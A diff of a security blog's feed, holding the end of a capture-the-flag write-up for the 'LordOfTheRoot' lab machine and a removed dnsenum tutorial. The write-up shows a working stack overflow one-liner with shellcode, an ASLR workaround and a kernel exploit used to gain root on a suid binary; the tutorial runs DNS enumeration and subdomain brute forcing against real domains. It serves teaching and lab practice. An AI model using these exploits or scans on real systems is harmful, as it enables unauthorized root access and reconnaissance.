+<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+0000| 0xbffff640 (&ldquo;CCCC&rdquo;)
+0004| 0xbffff644 &mdash;> 0xbffff600 (&lsquo;A&rsquo; <repeats 60 times>, &ldquo;BBBBCCCC&rdquo;)
+0008| 0xbffff648 &mdash;> 0xbffff6e0 &mdash;> 0xbffff8c1 (&ldquo;XDG_SESSION_ID=1&rdquo;)
+0012| 0xbffff64c &mdash;> 0xb7feccea (&lt;call_init+26>:    add    ebx,0x12316)
+0016| 0xbffff650 &mdash;> 0x2
+0020| 0xbffff654 &mdash;> 0xbffff6d4 &mdash;> 0xbffff803 (&ldquo;/tmp/file&rdquo;)
+0024| 0xbffff658 &mdash;> 0xbffff674 &mdash;> 0x658f7063
+0028| 0xbffff65c &mdash;> 0x804974c &mdash;> 0xb7e2f990 (&lt;__libc_start_main>: push   ebp)
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+```</p>
+
+<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>
+
+<p><code>
+cat /proc/sys/kernel/randomize_va_space
+2
+</code></p>
+
+<p>I checked with <em>ldd</em>:</p>
+
+<p>```
+smeagol@LordOfTheRoot:/tmp$ ldd file</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb773d000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
+/lib/ld-linux.so.2 (0xb773f000)
+</code></pre>
+
+<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb770c000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
+/lib/ld-linux.so.2 (0xb770e000)
+</code></pre>
+
+<p>```</p>
+
+<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>
+
+<p>```
+smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
+smeagol@LordOfTheRoot:/tmp$ ldd file</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
+/lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
+/lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>```</p>
+
+<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>
+
+<p><code>
+gdb-peda$ jmpcall esp
+Not found
+gdb-peda$ jmpcall esp libc
+0x4003ea85 : jmp esp
+</code></p>
+
+<p>Adjusted the exploit again, and it worked:</p>
+
+<p><code>
+gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+process 5184 is executing new program: /bin/dash
+$ whoami
+[New process 5187]
+process 5187 is executing new program: /usr/bin/whoami
+smeagol
+$ [Inferior 2 (process 5187) exited normally]
+Warning: not running or target is remote
+</code></p>
+
+<p>To gain root, we need to exploit the real suid binary:</p>
+
+<p>```
+smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c &lsquo;print &ldquo;A&rdquo; * 171 + &ldquo;\x85\xea\x03\x40&rdquo; + &ldquo;\x90&rdquo; * 2000 + &ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&rdquo;&rsquo;)</p>
+
+<h1>whoami</h1>
+
+<p>root
+```</p>
+
+<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>
+
+<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>
+
+<p><code>
+smeagol@LordOfTheRoot:/tmp$ ./overlay
+root@LordOfTheRoot:/tmp# whoami
+root
+</code></p>
+
+<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>
+
+<h4>Learn more</h4>
+
+<ul>
+<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
+<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
+<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
+</ul>
+
+
+<p>Will leave you with this:</p>
+
+<p><img class="center" src="/images/pentest/lordoftheroot/legolas.jpg" title="&lsquo;legolas&rsquo; &lsquo;legolas&rsquo;" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
@@ -1372,401 +2196,6 @@ noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;
 <p>```
 / A visit to a fresh place will bring \
 \ strange work.                       /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[dnsenum - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools/"/>
-    <updated>2017-05-29T05:32:26-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at dnsenum, one of the tools that come preinstalled on Kali for DNS information gathering.</p>
-
-<!-- more -->
-
-
-<p>Homepage: <a href="https://github.com/fwaeytens/dnsenum">https://github.com/fwaeytens/dnsenum</a></p>
-
-<h3>dnsenum description</h3>
-
-<blockquote><p>multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>
-
-<p>OPERATIONS:</p>
-
-<p>1) Get the host&rsquo;s addresse (A record).</p>
-
-<p>2) Get the namservers (threaded).</p>
-
-<p>3) Get the MX record (threaded).</p>
-
-<p>4) Perform axfr queries on nameservers and get BIND VERSION (threaded).</p>
-
-<p>5) Get extra names and subdomains via google scraping (google query = &ldquo;allinurl: -www site:domain&rdquo;).</p>
-
-<p>6) Brute force subdomains from file, can also perform recursion on subdomain that have NS records (all threaded).</p>
-
-<p>7) Calculate C class domain network ranges and perform whois queries on them (threaded).</p>
-
-<p>8) Perform reverse lookups on netranges ( C class or/and whois netranges) (threaded).</p>
-
-<p>9) Write to domain_ips.txt file ip-blocks.</p></blockquote>
-
-<h3>dnsenum options</h3>
-
-<p>``` plain
-dnsenum -h
-dnsenum.pl VERSION:1.2.3
-Usage: dnsenum.pl <a href="">Options</a> <domain>
-Note: the brute force -f switch is obligatory.
-GENERAL OPTIONS:
-  &mdash;dnsserver   <server></p>
-
-<pre><code>        Use this DNS server for A, NS and MX queries.
-</code></pre>
-
-<p>  &mdash;enum        Shortcut option equivalent to &mdash;threads 5 -s 15 -w.
-  -h, &mdash;help        Print this help message.
-  &mdash;noreverse       Skip the reverse lookup operations.
-  &mdash;nocolor     Disable ANSIColor output.
-  &mdash;private     Show and save private ips at the end of the file domain_ips.txt.
-  &mdash;subfile <file>  Write all valid subdomains to this file.
-  -t, &mdash;timeout <value> The tcp and udp timeout values in seconds (default: 10s).
-  &mdash;threads <value> The number of threads that will perform different queries.
-  -v, &mdash;verbose     Be verbose: show all the progress and all the error messages.
-GOOGLE SCRAPING OPTIONS:
-  -p, &mdash;pages <value>   The number of google search pages to process when scraping names,</p>
-
-<pre><code>        the default is 5 pages, the -s switch must be specified.
-</code></pre>
-
-<p>  -s, &mdash;scrap <value>   The maximum number of subdomains that will be scraped from Google (default 15).
-BRUTE FORCE OPTIONS:
-  -f, &mdash;file <file> Read subdomains from this file to perform brute force.
-  -u, &mdash;update  &lt;a|g|r|z></p>
-
-<pre><code>        Update the file specified with the -f switch with valid subdomains.
-a (all)     Update using all results.
-g       Update using only google scraping results.
-r       Update using only reverse lookup results.
-z       Update using only zonetransfer results.
-</code></pre>
-
-<p>  -r, &mdash;recursion   Recursion on subdomains, brute force all discovred subdomains that have an NS record.
-WHOIS NETRANGE OPTIONS:
-  -d, &mdash;delay <value>   The maximum value of seconds to wait between whois queries, the value is defined randomly, default: 3s.
-  -w, &mdash;whois       Perform the whois queries on c class network ranges.</p>
-
-<pre><code>         **Warning**: this can generate very large netranges and it will take lot of time to performe reverse lookups.
-</code></pre>
-
-<p>REVERSE LOOKUP OPTIONS:
-  -e, &mdash;exclude <regexp></p>
-
-<pre><code>        Exclude PTR records that match the regexp expression from reverse lookup results, useful on invalid hostnames.
-</code></pre>
-
-<p>OUTPUT OPTIONS:
-  -o &mdash;output <file>    Output in XML format. Can be imported in MagicTree (www.gremwell.com)
-```</p>
-
-<h3>Fix dnsenum whois and autoloader errors</h3>
-
-<p>First, some preliminary troubleshooting information: dnsenum relies on some Perl modules that may not be already on your system. When running it with certain flags, you might see some warnings like this one: Warning: can&rsquo;t load Net::Whois::IP module, whois queries disabled. To fix it, install the module by running <code>perl -MCPAN -e shell</code> and then at the prompt: <code>install Net::Whois::IP</code>. If you try again, you might get a different error, however: Can&rsquo;t locate package AutoLoader for @net::Whois::IP::ISA at /usr/bin/dnsenum line 536. I scoured the Internet for a bit before finding a workaround: you can make it go away by adding <code>require AutoLoader;</code> to the module source code, or by removing the Autuloader reference: changing <code>@ISA = qw(Exporter AutoLoader);</code> to <code>@ISA = qw(Exporter);</code>. To find out where the module is located, use the CPAN tool:</p>
-
-<p>``` plain
-cpan -D Net::Whois::IP
-Loading internal null logger. Install Log::Log4perl for logging messages
-Reading &lsquo;/root/.cpan/Metadata&rsquo;
-  Database was generated on Wed, 17 May 2017 06:54:04 GMT</p>
-
-<h2>Net::Whois::IP</h2>
-
-<pre><code>(no description)
-B/BS/BSCHMITZ/Net-Whois-IP-1.19.tar.gz
-/usr/local/share/perl/5.24.1/Net/Whois/IP.pm
-Installed: 1.19
-CPAN:      1.19  up to date
-Ben Schmitz (BSCHMITZ)
-ben@foink.com
-</code></pre>
-
-<p>```</p>
-
-<p>You can see the path here, now go apply the fix in the IP.pm file and the error should go away.</p>
-
-<h3>dnsenum usage</h3>
-
-<ul>
-<li>default</li>
-</ul>
-
-
-<p>``` plain
-dnsenum yahoo.com
-dnsenum.pl VERSION:1.2.3</p>
-
-<p>&mdash;&mdash;&ndash;   yahoo.com   &mdash;&mdash;&ndash;</p>
-
-<p>Host&rsquo;s addresses:</p>
-
-<hr />
-
-<p>yahoo.com.                               5        IN    A        206.190.36.45
-yahoo.com.                               5        IN    A        98.139.183.24
-yahoo.com.                               5        IN    A        98.138.253.109</p>
-
-<p>Name Servers:</p>
-
-<hr />
-
-<p>ns1.yahoo.com.                           5        IN    A        68.180.131.16
-ns3.yahoo.com.                           5        IN    A        203.84.221.53
-ns4.yahoo.com.                           5        IN    A        98.138.11.157
-ns2.yahoo.com.                           5        IN    A        68.142.255.16
-ns5.yahoo.com.                           5        IN    A        119.160.247.124</p>
-
-<p>Mail (MX) Servers:</p>
-
-<hr />
-
-<p>mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.32
-mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.37
-mta7.am0.yahoodns.net.                   5        IN    A        63.250.192.45
-mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.34
-mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.37
-mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.240
-mta7.am0.yahoodns.net.                   5        IN    A        98.136.216.26
-mta7.am0.yahoodns.net.                   5        IN    A        98.136.217.202
-mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.33
-mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.34
-mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.33
-mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.34
-mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.35
-mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.36
-mta5.am0.yahoodns.net.                   5        IN    A        98.136.216.25
-mta5.am0.yahoodns.net.                   5        IN    A        98.136.217.202
-mta6.am0.yahoodns.net.                   5        IN    A        98.136.216.25
-mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.38
-mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.37
-mta6.am0.yahoodns.net.                   5        IN    A        98.136.217.203
-mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.35
-mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.36
-mta6.am0.yahoodns.net.                   5        IN    A        63.250.192.46
-mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.37</p>
-
-<p>Trying Zone Transfers and getting Bind Versions:</p>
-
-<hr />
-
-<p>Trying Zone Transfer for yahoo.com on ns4.yahoo.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for yahoo.com on ns5.yahoo.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for yahoo.com on ns2.yahoo.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for yahoo.com on ns3.yahoo.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for yahoo.com on ns1.yahoo.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>brute force file not specified, bay.
-```</p>
-
-<p>From this output, you can see that the script performed DNS queries of the yahoo.com domain, enumerated the DNS and mail servers, and attempted zone transfers through the AXFR record type. Successful zone transfers are a misconfiguration that can have serious security impacts, because the DNS server sends its zone records to whoever requested them, thus revealing potentially sensitive information about the internal network topology, etc.</p>
-
-<ul>
-<li>with the &mdash;enum shortcut, which includes the flags: &mdash;threads 5 (5 threads), -s 15 (15 maximum subdomains to be scraped from Google), and -w (perform whois queries on class C ranges)</li>
-</ul>
-
-
-<p>``` plain
-dnsenum &mdash;enum kali.org
-dnsenum.pl VERSION:1.2.3</p>
-
-<p>&mdash;&mdash;&ndash;   kali.org   &mdash;&mdash;&ndash;</p>
-
-<p>Host&rsquo;s addresses:</p>
-
-<hr />
-
-<p>kali.org.                                5        IN    A        192.124.249.10</p>
-
-<p>Name Servers:</p>
-
-<hr />
-
-<p>ns5.no-ip.com.                           5        IN    A        204.16.255.155
-ns4.no-ip.com.                           5        IN    A        204.16.254.44
-ns1.no-ip.com.                           5        IN    A        204.16.255.55
-ns3.no-ip.com.                           5        IN    A        207.34.6.1
-ns2.no-ip.com.                           5        IN    A        204.16.254.6</p>
-
-<p>Mail (MX) Servers:</p>
-
-<hr />
-
-<p>aspmx.l.google.com.                      5        IN    A        108.177.15.27
-alt3.aspmx.l.google.com.                 5        IN    A        74.125.23.26
-alt4.aspmx.l.google.com.                 5        IN    A        74.125.28.26
-alt1.aspmx.l.google.com.                 5        IN    A        108.177.14.27
-alt2.aspmx.l.google.com.                 5        IN    A        74.125.200.27</p>
-
-<p>Trying Zone Transfers and getting Bind Versions:</p>
-
-<hr />
-
-<p>Trying Zone Transfer for kali.org on ns2.no-ip.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for kali.org on ns4.no-ip.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for kali.org on ns3.no-ip.com &hellip;
-AXFR record query failed: REFUSED</p>
-
-<p>Trying Zone Transfer for kali.org on ns1.no-ip.com &hellip;
-AXFR record query failed: NOTAUTH</p>
-
-<p>Trying Zone Transfer for kali.org on ns5.no-ip.com &hellip;
-AXFR record query failed: NOTAUTH</p>
-
-<p>Scraping kali.org subdomains from Google:</p>
-
-<hr />
-
-<p> &mdash;&mdash;   Google search page: 1   &mdash;&mdash;</p>
-
-<p> &mdash;&mdash;   Google search page: 2   &mdash;&mdash;</p>
-
-<p>  docs</p>
-
-<p> &mdash;&mdash;   Google search page: 3   &mdash;&mdash;</p>
-
-<p>  de.docs
-  archive</p>
-
-<p> &mdash;&mdash;   Google search page: 4   &mdash;&mdash;</p>
-
-<p>  archive-4
-  ja.docs</p>
-
-<p> &mdash;&mdash;   Google search page: 5   &mdash;&mdash;</p>
-
-<p>Google Results:</p>
-
-<hr />
-
-<p>de.docs.kali.org.                        5        IN    A        192.124.249.10
-ja.docs.kali.org.                        5        IN    A        192.124.249.10
-docs.kali.org.                           5        IN    A        192.124.249.10
-archive.kali.org.                        5        IN    CNAME    hera.kali.org.
-hera.kali.org.                           5        IN    A        192.99.45.140
-archive-4.kali.org.                      5        IN    CNAME    hecate.kali.org.
-hecate.kali.org.                         5        IN    A        149.202.201.51</p>
-
-<p>brute force file not specified, bay.
-```</p>
-
-<p>One thing that you should keep in mind is that the Google scraping feature might not always work. In that case, you can check manually by using the same Google operator that dnsenum uses, with &ldquo;allinurl:-www site:target.com&rdquo;</p>
-
-<ul>
-<li>bruteforce subdomains and perform whois queries</li>
-</ul>
-
-
-<p>dnsenum has a domain bruteforce file located at <code>/usr/share/dnsenum/dns.txt</code>:</p>
-
-<p><code>plain
-wc -l /usr/share/dnsenum/dns.txt
-1480 /usr/share/dnsenum/dns.txt
-</code></p>
-
-<p>Let&rsquo;s see some domain bruteforcing in action! Again, looking at kali.org:</p>
-
-<p>``` plain
-dnsenum -f /usr/share/dnsenum/dns.txt -w &mdash;noreverse kali.org
-[&hellip;]
-Brute forcing with /usr/share/dnsenum/dns.txt:</p>
-
-<hr />
-
-<p>archive.kali.org.                        5        IN    CNAME    hera.kali.org.
-hera.kali.org.                           5        IN    A        192.99.45.140
-bugs.kali.org.                           5        IN    A        198.50.203.236
-bugs.kali.org.                           5        IN    A        198.50.203.235
-forums.kali.org.                         5        IN    A        192.124.249.12
-hermes.kali.org.                         5        IN    A        198.27.70.128
-http.kali.org.                           5        IN    CNAME    hebe.kali.org.
-hebe.kali.org.                           5        IN    A        192.99.200.113
-mail.kali.org.                           5        IN    CNAME    apollo.kali.org.
-apollo.kali.org.                         5        IN    A        23.239.31.82
-old.kali.org.                            5        IN    CNAME    hermes.kali.org.
-hermes.kali.org.                         5        IN    A        198.27.70.128
-pan.kali.org.                            5        IN    A        167.114.101.148
-shop.kali.org.                           5        IN    A        45.79.147.167
-www.kali.org.                            5        IN    A        192.124.249.10</p>
-
-<p>Launching Whois Queries:</p>
-
-<hr />
-
-<p> whois ip result:   23.239.31.0        &ndash;>      23.239.0.0/19
- whois ip result:   45.79.147.0        &ndash;>      45.79.0.0/16
- whois ip result:   167.114.101.0      &ndash;>      167.114.0.0/16
- whois ip result:   192.99.45.0        &ndash;>      192.99.0.0/16
- whois ip result:   192.124.249.0      &ndash;>      192.124.249.0/24
- whois ip result:   198.27.70.0        &ndash;>      198.27.64.0/18
- whois ip result:   198.50.203.0       &ndash;>      198.50.203.0/27</p>
-
-<p>kali.org________</p>
-
-<p> 192.99.0.0/16
- 23.239.0.0/19
- 45.79.0.0/16
- 198.50.203.0/27
- 192.124.249.0/24
- 167.114.0.0/16
- 198.27.64.0/18</p>
-
-<p>kali.org ip blocks:</p>
-
-<hr />
-
-<p> 23.239.31.82/32
- 45.79.147.167/32
- 167.114.101.148/32
- 192.99.45.140/32
- 192.99.200.113/32
- 192.124.249.10/32
- 192.124.249.12/32
- 198.27.70.128/32
- 198.50.203.235/32
- 198.50.203.236/32</p>
-
-<p>done.
-```</p>
-
-<p>And today&rsquo;s cow saying is:</p>
-
-<p>``` plain
-/ Tomorrow, this will be part of the    \
-| unchangeable past but fortunately, it |
-\ can still be changed today.           /</p>
 
 <hr />
 
